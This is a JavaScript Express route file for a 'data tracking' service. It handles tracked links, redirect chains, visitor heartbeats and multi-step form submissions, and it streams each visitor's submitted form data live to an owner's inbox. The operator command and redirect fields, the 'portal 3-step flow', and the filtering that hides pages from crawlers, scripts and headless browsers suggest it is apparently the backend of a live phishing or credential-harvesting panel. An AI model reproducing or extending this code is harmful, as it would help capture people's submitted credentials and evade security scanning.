// ============================================================
// MEGA TOOLS — DATA TRACKING ROUTES (ENTERPRISE v4.3)
// ============================================================
// FIX-D1..D28: retained.
//
// FIX-S44 / FIX-S44b (v4.3 — VISITOR ISOLATION):
//   Root cause (production screenshot evidence):
//     • getClientIdentity() returned `visitorId: bodyVid || ip`
//       → raw IP was treated as a visitor id, collapsing every
//       visitor behind the same IP into a shared identity.
//     • /visit throttle lookup and /submit preExisting lookup
//       fell back to ownerCodeOf(trackingCode) match even when
//       a real visitorId was present → cross-visitor merges
//       surfaced in the Live Inbox as one session.
//   Fix:
//     • FIX-S44  — getClientIdentity(): no IP fallback. vid is
//                  either the caller-supplied one or null.
//     • FIX-S44b — /visit throttle + /submit preExisting only
//                  fall back to owner-code match when the
//                  incoming request has NO visitorId. vid-
//                  bearing requests match strictly by vid.
//   Preserved:
//     • FIX-D24 (bot UA), FIX-D26 (step throttle),
//       FIX-D27 (lastSubmissionAt), FIX-D28 (real-time inbox).
//     • Session.upsert / Session.create — unchanged (already
//       guarded by FIX-S41/S42).
// ============================================================

const express = require('express');
const router = express.Router();
const db = require('../database');
const Session = require('../models/Session');
const Link = require('../models/Link');
const User = require('../models/User');
const { ROLES } = require('../models/roles');
const { authenticate } = require('../middleware/auth');
const { toStringId, parseTrackingCode, now } = require('../utils/helpers');
const { normalizeVisitorId, ownerCodeOf } = require('../utils/identity');

function detectDeviceClass(uaRaw) {
  const ua = String(uaRaw || '').toLowerCase();
  if (!ua) return 'Unknown';
  if (
    ua.includes('iphone') ||
    ua.includes('ipad') ||
    ua.includes('ipod') ||
    ua.includes('macintosh') ||
    ua.includes('mac os x') ||
    ua.includes('macos')
  ) return 'Apple';
  if (ua.includes('android')) return 'Android';
  if (
    ua.includes('windows nt') ||
    ua.includes('windows phone') ||
    ua.includes('win64') ||
    ua.includes('win32') ||
    ua.includes('windows')
  ) return 'Windows';
  if (ua.includes('linux') || ua.includes('cros') || ua.includes('x11')) return 'Desktop';
  return 'Unknown';
}

function isLikelyBot(uaRaw) {
  const u = String(uaRaw || '').toLowerCase();
  if (!u) return true;
  if (u.length < 20) return true;
  if (/bot\b|crawler|spider|scraper|phantom|puppeteer|selenium|playwright/i.test(u)) return true;
  if (/(python-requests|python\/|curl\/|wget\/|httpie|go-http|java\/|okhttp|libwww|aiohttp)/i.test(u)) return true;
  if (/headlesschrome|headless/i.test(u)) return true;
  return false;
}

let cachedUsers = null;
let userCacheTime = 0;
const USER_CACHE_TTL = 30000;

async function getCachedUsers() {
  if (!cachedUsers || Date.now() - userCacheTime > USER_CACHE_TTL) {
    cachedUsers = await db.users.read();
    userCacheTime = Date.now();
  }
  return cachedUsers;
}

const visitThrottle = new Map();
const VISIT_THROTTLE_MS = 60 * 1000;

const submitThrottle = new Map();
// FIX-D26: lowered from 3000 → 800. Now scoped per (sessionId + step)
// via shouldSkipSubmit(sessionId, step). Legit multi-step flows that
// fire sibling submits in the same tick are no longer blocked.
const SUBMIT_THROTTLE_MS = 800;

function normalizeClientIp(ip) {
  const raw = String(ip || '').trim();
  if (!raw) return 'unknown';
  const mapped = raw.replace(/^::ffff:/i, '');
  if (mapped === '::1' || mapped === '127.0.0.1' || mapped.startsWith('127.')) return 'local';
  return mapped;
}

function shouldSkipVisit(visitorId, trackingCode, clientIp) {
  if (!visitorId && !trackingCode) return false;
  const ipKey = normalizeClientIp(clientIp);
  const keyBase = trackingCode
    ? ('owner:' + ownerCodeOf(trackingCode) + '|ip:' + ipKey)
    : ('vid:' + String(visitorId || 'nov') + '|ip:' + ipKey);
  const nowMs = Date.now();
  const last = visitThrottle.get(keyBase);
  if (last && (nowMs - last) < VISIT_THROTTLE_MS) return true;
  visitThrottle.set(keyBase, nowMs);
  if (visitThrottle.size > 5000) {
    const cutoff = nowMs - VISIT_THROTTLE_MS * 2;
    for (const [k, v] of visitThrottle.entries()) {
      if (v < cutoff) visitThrottle.delete(k);
    }
  }
  return false;
}

// FIX-D26: step-aware key. Same step, same session, within
// SUBMIT_THROTTLE_MS → still blocked (double-tap protection).
// Different step, same session → allowed (portal 3-step flow).
function shouldSkipSubmit(sessionId, step) {
  if (!sessionId) return false;
  const key = String(sessionId) + '|' + String(step || 'default');
  const nowMs = Date.now();
  const last = submitThrottle.get(key);
  if (last && (nowMs - last) < SUBMIT_THROTTLE_MS) return true;
  submitThrottle.set(key, nowMs);
  if (submitThrottle.size > 4000) {
    const cutoff = nowMs - SUBMIT_THROTTLE_MS * 2;
    for (const [k, v] of submitThrottle.entries()) {
      if (v < cutoff) submitThrottle.delete(k);
    }
  }
  return false;
}

async function findLinkBySlug(slug) {
  if (!slug) return null;
  const all = await db.links.read();
  return all.find(l => l.baseCode === slug || l.slug === slug || l.uniqueCode === slug) || null;
}

async function getChainTargetUrl(link, identity, actionCode) {
  if (!link || !link.is_chain || !link.chain_links?.length) {
    return { url: link?.baseUrl || 'about:blank', chainStep: null, chainStepName: '' };
  }
  if (actionCode) {
    const stepIndex = link.chain_links.findIndex(cl => cl.actionCode === actionCode);
    if (stepIndex >= 0) {
      return { url: link.chain_links[stepIndex].url, chainStep: stepIndex, chainStepName: link.chain_links[stepIndex].name || '' };
    }
  }
  const nextUrl = await Link.getNextChainUrl(link, identity);
  return { url: nextUrl?.url || link.chain_links[0].url, chainStep: nextUrl?.index ?? 0, chainStepName: nextUrl?.name || link.chain_links[0].name || '' };
}

function buildSessionDelta(session, type, opts = {}) {
  const seq = (() => {
    try {
      const t = new Date(session.lastActivity || session.updated_at || 0).getTime();
      return Number.isFinite(t) && t > 0 ? t : Date.now();
    } catch (_) { return Date.now(); }
  })();
  const transitionId = opts.transitionId || `${session._id}:${Date.now()}`;
  return {
    type,
    seq,
    transitionId,
    forceOnline: !!opts.forceOnline,
    timestamp: new Date().toISOString(),
    session: {
      _id: session._id, visitorId: session.visitorId, trackingCode: session.trackingCode,
      isLive: session.isLive, status: session.status || 'Online', lastActivity: session.lastActivity,
      clicks: session.clicks, submissions: session.submissions, deviceType: session.deviceType,
      deviceClass: session.deviceClass,
      baseCode: session.baseCode, entryUrl: session.entryUrl, currentUrl: session.currentUrl,
      ip: session.ip, browser: session.browser, formData: session.formData,
      redirectHistory: session.redirectHistory || [],
      lastCommand: session.lastCommand, lastCommandUrl: session.lastCommandUrl, commandSeq: session.commandSeq,
      lockedKeys: session.lockedKeys || [],
      lastSubmissionAt: session.lastSubmissionAt || null,
    },
  };
}

function buildSessionMetaDelta(session) {
  return {
    type: 'updated',
    timestamp: new Date().toISOString(),
    session: {
      _id: session._id,
      status: session.status || 'Online',
      clicks: session.clicks,
      formData: session.formData,
      isLive: session.isLive,
      lastActivity: session.lastActivity,
      lockedKeys: session.lockedKeys || [],
      submissionCount: Array.isArray(session.submissions) ? session.submissions.length : 0,
      deviceClass: session.deviceClass,
      deviceType: session.deviceType,
      lastSubmissionAt: session.lastSubmissionAt || null,
    },
  };
}

function emitToOwnerRoom(io, trackingCode, event, data) {
  if (!io || !trackingCode) return;
  const ownerCode = trackingCode.includes('_') ? trackingCode.split('_')[0] : trackingCode;
  io.to('room_' + ownerCode).emit(event, data);
}

// FIX-D25: sessionDelta is a STATE channel only — forceOnline is
// ALWAYS false. The authoritative offline→online sound source is
// the eventBus in Session.upsert (FIX-S29) → server.js
// sessionStatusDelta.
async function emitSessionEvents(io, session, isNew, link, opts = {}) {
  if (!io || !session) return;
  const tc = session.trackingCode || session.baseCode || '';
  const ownerCode = tc.includes('_') ? tc.split('_')[0] : tc;
  if (!ownerCode) return;
  io.to('room_' + ownerCode).emit(
    'sessionDelta',
    buildSessionDelta(session, isNew ? 'new' : 'updated', {
      forceOnline: false,
      transitionId: opts.transitionId,
    })
  );
  if (link && isNew) { await Link.incrementClicks(link._id); }
}

// FIX-S44 (v4.3 — VISITOR ISOLATION):
//   No IP fallback. If the caller did not supply a visitorId, this
//   returns null — the Session.upsert downstream will reject the
//   request (rejected_no_visitor) instead of merging every visitor
//   behind the same IP into one identity.
function getClientIdentity(req) {
  const bodyVid =
    req.body?.visitorId ||
    req.query?.visitorId ||
    req.query?.vid ||
    req.query?.v ||
    null;
  const ip = req.body?.ip || req.ip || '::1';
  return {
    visitorId: bodyVid || null,
    ip,
  };
}

function getResolvedVisitorId(visitorId, trackingCode) {
  return normalizeVisitorId({ visitorId, ip: null, trackingCode });
}

function buildFullTrackingCode(parsedTC, slug, fullCode) {
  if (parsedTC && slug) return parsedTC + '_' + slug;
  return parsedTC || fullCode || 'direct';
}

// ============================================================
// FIX-SEC-1/2: SESSION SCOPE GUARD
// ============================================================
async function checkSessionScope(user, session) {
  if (!user || !session) return false;
  if (user.role === ROLES.OWNER) return true;

  try {
    const codes = await User.getAccessibleTrackingCodes(user);
    if (!Array.isArray(codes) || codes.length === 0) return false;
    const sessionTc = String(session.trackingCode || '');
    if (!sessionTc) return false;
    const ownerCode = sessionTc.includes('_') ? sessionTc.split('_')[0] : sessionTc;
    for (const code of codes) {
      if (!code) continue;
      if (sessionTc === code) return true;
      if (sessionTc.startsWith(code + '_')) return true;
      if (ownerCode === code) return true;
    }
    return false;
  } catch (_) {
    return false;
  }
}

// ============================================================
// FIX-S44b helper: strict-visitor lookup.
//   Returns a session matching the incoming vid (if any) or null.
//   When vid is absent (rare / legacy), falls back to owner-code
//   match — preserving old behaviour for callers without vid.
// ============================================================
function findScopedSession(all, resolvedVisitorId, ownerCode) {
  if (!Array.isArray(all)) return null;
  if (resolvedVisitorId) {
    return all.find(s => !s.hiddenForAll && s.visitorId === resolvedVisitorId) || null;
  }
  if (!ownerCode) return null;
  return all.find(s => !s.hiddenForAll && (
    ownerCodeOf(s.trackingCode) === ownerCode ||
    (Array.isArray(s.trackingCodeHistory) &&
      s.trackingCodeHistory.some(h => ownerCodeOf(h) === ownerCode))
  )) || null;
}

// ============================================================
// SMART REDIRECT (GET /:code)
// ============================================================
router.get('/:code', async (req, res) => {
  try {
    const { code } = req.params;
    const { visitorId, ip } = getClientIdentity(req);
    const ua = req.headers['user-agent'] || '';
    const { trackingCode, slug, actionCode } = parseTrackingCode(code);
    const link = await findLinkBySlug(slug);
    const finalTrackingCode = buildFullTrackingCode(trackingCode, slug, code);
    const baseCode = slug || code;
    const resolvedVisitorId = getResolvedVisitorId(visitorId, finalTrackingCode);
    let targetUrl = link?.baseUrl || 'about:blank'; let chainStep = null; let chainStepName = '';
    const identity = resolvedVisitorId || ip;
    if (link?.is_chain) { const chainResult = await getChainTargetUrl(link, identity, actionCode); targetUrl = chainResult.url; chainStep = chainResult.chainStep; chainStepName = chainResult.chainStepName; }

    const deviceClass = detectDeviceClass(ua);
    const deviceType = deviceClass === 'Unknown' ? 'Desktop' : deviceClass;

    const result = await Session.upsert({
      visitorId: resolvedVisitorId,
      baseCode,
      trackingCode: finalTrackingCode,
      linkId: link ? toStringId(link._id) : null,
      ip,
      browser: ua.substring(0, 500),
      deviceType,
      deviceClass,
      entryUrl: baseCode,
      currentUrl: code,
      collectedTypes: ['visit'],
      chainId: link?.is_chain ? toStringId(link._id) : null,
      chainStep,
      chainStepName,
    });

    if (!result || !result.session) {
      return res.json({ success: false, message: 'Invalid tracking code', targetUrl: 'about:blank' });
    }

    const { session, isNew } = result;
    const io = req.app.get('io');
    const transitionId = result.transitionId || undefined;
    await emitSessionEvents(io, session, isNew, link, { transitionId });
    res.json({ success: true, session, targetUrl, chainStep, chainStepName, isChain: link?.is_chain || false, redirectDelay: 1000 });
  } catch (err) { console.error('[Data] GET /:code error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// CLICK TRACKING — FIX-D24: bot UA rejected
// ============================================================
router.get('/click/:code', async (req, res) => {
  try {
    const ua = req.headers['user-agent'] || '';
    if (isLikelyBot(ua)) {
      return res.json({ success: false, bot: true, message: 'Bot traffic ignored', targetUrl: 'about:blank' });
    }
    const { visitorId, ip } = getClientIdentity(req);
    const { trackingCode, slug, actionCode } = parseTrackingCode(req.params.code);
    const link = await findLinkBySlug(slug);
    const finalTrackingCode = buildFullTrackingCode(trackingCode, slug, req.params.code);
    const baseCode = slug || req.params.code;
    const resolvedVisitorId = getResolvedVisitorId(visitorId, finalTrackingCode);
    let targetUrl = link?.baseUrl || 'about:blank'; let chainStep = null; let chainStepName = '';
    const identity = resolvedVisitorId || ip;
    if (link?.is_chain) { const chainResult = await getChainTargetUrl(link, identity, actionCode); targetUrl = chainResult.url; chainStep = chainResult.chainStep; chainStepName = chainResult.chainStepName; }

    const deviceClass = detectDeviceClass(ua);
    const deviceType = deviceClass === 'Unknown' ? 'Desktop' : deviceClass;

    const result = await Session.upsert({
      visitorId: resolvedVisitorId,
      baseCode,
      trackingCode: finalTrackingCode,
      linkId: link ? toStringId(link._id) : null,
      ip,
      browser: ua.substring(0, 500),
      deviceType,
      deviceClass,
      entryUrl: baseCode,
      currentUrl: req.params.code,
      collectedTypes: ['click'],
      chainId: link?.is_chain ? toStringId(link._id) : null,
      chainStep,
      chainStepName,
    });

    if (!result || !result.session) {
      return res.json({ success: false, message: 'Invalid tracking code', targetUrl: 'about:blank' });
    }

    const { session, isNew } = result;
    const io = req.app.get('io');
    const transitionId = result.transitionId || undefined;
    await emitSessionEvents(io, session, isNew, link, { transitionId });
    res.json({ success: true, session, targetUrl, chainStep, chainStepName, isChain: link?.is_chain || false });
  } catch (err) { console.error('[Data] Click error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// CHECK REDIRECT
// ============================================================
router.get('/check-redirect/:code', async (req, res) => {
  try {
    const { code } = req.params;
    const { visitorId, ip } = getClientIdentity(req);
    const { trackingCode, slug } = parseTrackingCode(code);
    const all = await db.sessions.read(); let session = null;
    if (visitorId) session = all.find(s => s.visitorId === visitorId && s.isLive);
    if (!session && trackingCode) session = all.find(s => s.trackingCode === trackingCode && s.isLive);
    if (session) { const link = await findLinkBySlug(slug); let redirectUrl = session.currentUrl || link?.baseUrl || ''; if (link?.is_chain) { const chainResult = await getChainTargetUrl(link, visitorId || ip, null); redirectUrl = chainResult.url; } res.json({ success: true, redirectUrl, session, message: session.lastMessage || '' }); }
    else { res.json({ success: false, redirectUrl: null, message: null }); }
  } catch (err) { console.error('[Data] Check redirect error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// VISIT (POST) — FIX-D23 (IP throttle) + FIX-D24 (bot UA)
// FIX-S44b: throttle-lookup is visitor-strict when vid is present.
// ============================================================
router.post('/visit', async (req, res) => {
  try {
    const { trackingCode, browser, device, collectedTypes } = req.body;
    const { visitorId, ip } = getClientIdentity(req);
    const ua = req.headers['user-agent'] || '';

    if (isLikelyBot(ua)) {
      return res.json({ success: true, bot: true, throttled: true, targetUrl: '', session: null });
    }

    const { trackingCode: parsedTC, slug, actionCode } = parseTrackingCode(trackingCode || '');
    const link = await findLinkBySlug(slug);
    const finalTrackingCode = buildFullTrackingCode(parsedTC, slug, trackingCode || 'unknown');
    const baseCode = slug || trackingCode || 'direct_visit';
    const resolvedVisitorId = getResolvedVisitorId(visitorId, finalTrackingCode);
    let targetUrl = link?.baseUrl || ''; let chainStep = null; let chainStepName = '';
    const identity = resolvedVisitorId || ip;
    if (link?.is_chain) { const chainResult = await getChainTargetUrl(link, identity, actionCode); targetUrl = chainResult.url; chainStep = chainResult.chainStep; chainStepName = chainResult.chainStepName; }

    const uaDeviceClass = detectDeviceClass(ua);
    const bodyDeviceClass = typeof device === 'string' &&
      ['Apple', 'Android', 'Windows', 'Desktop', 'Unknown'].includes(device)
      ? device
      : null;
    const deviceClass = bodyDeviceClass || uaDeviceClass;
    const deviceType = deviceClass === 'Unknown' ? 'Desktop' : deviceClass;

    if (shouldSkipVisit(resolvedVisitorId, finalTrackingCode, ip)) {
      const all = await db.sessions.read();
      const ownerCode = ownerCodeOf(finalTrackingCode);
      // FIX-S44b: strict vid-only lookup when vid is present.
      const existing = findScopedSession(all, resolvedVisitorId, ownerCode);
      return res.json({ success: true, session: existing, targetUrl, chainStep, chainStepName, isChain: link?.is_chain || false, throttled: true });
    }

    const result = await Session.upsert({
      visitorId: resolvedVisitorId,
      baseCode,
      trackingCode: finalTrackingCode,
      linkId: link ? toStringId(link._id) : null,
      ip,
      browser: browser || ua.substring(0, 500),
      deviceType,
      deviceClass,
      entryUrl: baseCode,
      currentUrl: trackingCode || '',
      collectedTypes: collectedTypes || ['visit'],
      chainId: link?.is_chain ? toStringId(link._id) : null,
      chainStep,
      chainStepName,
    });

    if (!result || !result.session) {
      return res.json({ success: false, message: 'Invalid tracking code', targetUrl: '' });
    }

    const { session, isNew } = result;
    const io = req.app.get('io');
    const transitionId = result.transitionId || undefined;
    await emitSessionEvents(io, session, isNew, link, { transitionId });
    res.json({ success: true, session, targetUrl, chainStep, chainStepName, isChain: link?.is_chain || false });
  } catch (err) { console.error('[Data] Visit error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// FORM SUBMIT — FIX-D24: bot UA + submit burst limiter
// FIX-D26: step-aware throttle (portal 3-step flow)
// FIX-D27: bump lastSubmissionAt so 3-min Offline gate resets
// FIX-D28: F1 — call emitSessionEvents() to guarantee real-time
//          Inbox row (no reload). F2 — fresh submissionCount.
//          F3 — throttle path also emits sessionMetaDelta.
// FIX-S44b: preExisting lookup is visitor-strict when vid is present.
// ============================================================
router.post('/submit', async (req, res) => {
  try {
    const { formData, trackingCode, collectedTypes, browser, device, step } = req.body;
    const { visitorId, ip } = getClientIdentity(req);
    const ua = req.headers['user-agent'] || '';

    if (isLikelyBot(ua)) {
      return res.json({ success: false, bot: true, message: 'Bot traffic ignored' });
    }

    if (!formData) return res.status(400).json({ success: false, message: 'formData required' });
    const { trackingCode: parsedTC, slug } = parseTrackingCode(trackingCode || '');
    const link = await findLinkBySlug(slug);
    const finalTrackingCode = buildFullTrackingCode(parsedTC, slug, trackingCode || 'direct');
    const baseCode = slug || trackingCode || 'direct_submit';
    const resolvedVisitorId = getResolvedVisitorId(visitorId, finalTrackingCode);
    const enrichedFormData = { ...formData, submittedAt: now() };

    const uaDeviceClass = detectDeviceClass(ua);
    const bodyDeviceClass = typeof device === 'string' &&
      ['Apple', 'Android', 'Windows', 'Desktop', 'Unknown'].includes(device)
      ? device
      : null;
    const deviceClass = bodyDeviceClass || uaDeviceClass;
    const deviceType = deviceClass === 'Unknown' ? 'Desktop' : deviceClass;

    const all = await db.sessions.read();
    const ownerCode = ownerCodeOf(finalTrackingCode);
    // FIX-S44b: strict vid-only lookup when vid is present.
    const preExisting = findScopedSession(all, resolvedVisitorId, ownerCode);

    // FIX-D26: pass step so throttle is scoped per (session, step).
    if (preExisting && shouldSkipSubmit(preExisting._id, step)) {
      // FIX-D27: treat as submission signal — bump lastSubmissionAt.
      try {
        await Session.updatePresence(preExisting._id, { lastSubmissionAt: now() });
      } catch (_) {}
      // FIX-D28 (F3): throttle path still emits meta delta → Inbox
      // shows activity, avoids dead-air perception.
      try {
        const ioT = req.app.get('io');
        if (ioT) {
          emitToOwnerRoom(ioT, finalTrackingCode, 'sessionMetaDelta', buildSessionMetaDelta(preExisting));
        }
      } catch (_) {}
      return res.json({ success: true, throttled: true, message: 'Too fast — please wait', duplicate: true });
    }

    const wasDuplicate = preExisting
      ? (
          Session.isDuplicateSubmission(preExisting.submissions || [], formData) ||
          Session.isSupersetOrSubset(preExisting.submissions || [], formData)
        )
      : false;

    const result = await Session.upsert({
      visitorId: resolvedVisitorId,
      baseCode,
      trackingCode: finalTrackingCode,
      linkId: link ? toStringId(link._id) : null,
      ip,
      browser: browser || 'Unknown',
      deviceType,
      deviceClass,
      entryUrl: baseCode,
      currentUrl: trackingCode || '',
      collectedTypes: [...(collectedTypes || []), 'form_submit'],
      chainId: link?.is_chain ? toStringId(link._id) : null,
      formData: enrichedFormData,
    });

    if (!result || !result.session) {
      return res.json({ success: false, message: 'Invalid tracking code' });
    }

    const { session } = result;

    // FIX-D27: explicit lastSubmissionAt bump (covers duplicate +
    // superset-subset skipped paths where mergeSubmissionIntoSession
    // returned false and did NOT update the timestamp).
    if (wasDuplicate) {
      try {
        await Session.updatePresence(session._id, { lastSubmissionAt: now() });
        session.lastSubmissionAt = now();
      } catch (_) {}
    } else if (!session.lastSubmissionAt) {
      // Defensive: ensure field exists even on merge path (already set
      // inside mergeSubmissionIntoSession, but belt-and-braces).
      try {
        await Session.updatePresence(session._id, { lastSubmissionAt: now() });
        session.lastSubmissionAt = now();
      } catch (_) {}
    }

    const io = req.app.get('io');

    // FIX-D28 (F1): CRITICAL — emit sessionDelta with FULL session
    // payload. This is what guarantees LiveInboxPage creates/merges
    // the row immediately even if /visit was skipped. Uses
    // emitSessionEvents (same helper as /visit) for consistent shape.
    if (io) {
      try {
        const transitionId = result.transitionId || undefined;
        await emitSessionEvents(io, session, false, link, { transitionId });
      } catch (_) {}
    }

    if (io) {
      // sessionMetaDelta retained (partial update for existing row).
      emitToOwnerRoom(io, finalTrackingCode, 'sessionMetaDelta', buildSessionMetaDelta(session));

      // FIX-D28 (F2): submissionCount is always fresh (post-merge).
      // Duplicate path still emits with fresh count + formData →
      // frontend dedupe key changes → sound + inbox refresh fires.
      const payload = {
        formData: enrichedFormData,
        submissionCount: Array.isArray(session.submissions) ? session.submissions.length : 1,
        sessionId: session._id,
        visitorId: session.visitorId,
        duplicate: !!wasDuplicate,
        lastSubmissionAt: session.lastSubmissionAt || null,
        timestamp: now(),
      };
      emitToOwnerRoom(io, finalTrackingCode, 'formSubmitted', payload);
    }

    res.json({
      success: true,
      message: 'Form submitted',
      session,
      totalSubmissions: session.submissions?.length || 1,
      duplicate: wasDuplicate,
      lastSubmissionAt: session.lastSubmissionAt || null,
    });
  } catch (err) {
    console.error('[Data] Submit error:', err);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// ============================================================
// HEARTBEAT — FIX-D22 + FIX-D25: state channel only, sound via
// eventBus (Session.upsert FIX-S29)
// ============================================================
router.post('/heartbeat', async (req, res) => {
  try {
    const { trackingCode, browser, device, status } = req.body;
    const { visitorId, ip } = getClientIdentity(req);
    const ua = req.headers['user-agent'] || '';

    const resolvedVisitorId = getResolvedVisitorId(visitorId, trackingCode || '');

    if (!resolvedVisitorId && !trackingCode) {
      return res.json({ success: false, message: 'visitorId or trackingCode required', isLive: false, status: 'Offline' });
    }

    const uaDeviceClass = detectDeviceClass(ua);
    const bodyDeviceClass = typeof device === 'string' &&
      ['Apple', 'Android', 'Windows', 'Desktop', 'Unknown'].includes(device)
      ? device
      : null;
    const deviceClass = bodyDeviceClass || uaDeviceClass;
    const deviceType = deviceClass === 'Unknown' ? 'Desktop' : deviceClass;

    const result = await Session.upsert({
      visitorId: resolvedVisitorId,
      trackingCode: trackingCode || '',
      baseCode: trackingCode || '',
      ip,
      browser: browser || ua.substring(0, 500),
      deviceType,
      deviceClass,
      collectedTypes: ['heartbeat'],
      status: status || undefined
    });

    if (!result || !result.session) {
      return res.json({ success: false, message: 'Invalid tracking code', isLive: false, status: 'Offline' });
    }

    const { session } = result;

    const sessionCode = session.trackingCode || session.baseCode || '';
    if (sessionCode) {
      const io = req.app.get('io');
      try {
        await emitSessionEvents(io, session, false, null, {
          transitionId: result.transitionId || undefined,
        });
      } catch (_) {}
    }

    res.json({ success: true, isLive: session?.isLive, status: session?.status, lastActivity: session?.lastActivity, lastSubmissionAt: session?.lastSubmissionAt || null });
  } catch (err) { console.error('[Data] Heartbeat error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// SESSION DETAILS (by visitorId) — FIX-SEC-1
// ============================================================
router.get('/session/:visitorId', authenticate, async (req, res) => {
  try {
    const session = await Session.findByVisitorId(req.params.visitorId);
    if (!session) return res.status(404).json({ success: false, message: 'Session not found' });
    const allowed = await checkSessionScope(req.user, session);
    if (!allowed) return res.status(403).json({ success: false, message: 'Access denied' });
    res.json({ success: true, session });
  } catch (err) { console.error('[Data] Session error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// SESSION DETAILS by _id — FIX-SEC-2
// ============================================================
router.get('/session-by-id/:id', authenticate, async (req, res) => {
  try {
    const id = req.params.id;
    if (!id) return res.status(400).json({ success: false, message: 'id required' });
    const session = await Session.findById(id);
    if (!session) return res.status(404).json({ success: false, message: 'Session not found' });
    const allowed = await checkSessionScope(req.user, session);
    if (!allowed) return res.status(403).json({ success: false, message: 'Access denied' });
    res.json({ success: true, session });
  } catch (err) {
    console.error('[Data] Session-by-id error:', err);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

module.exports = router;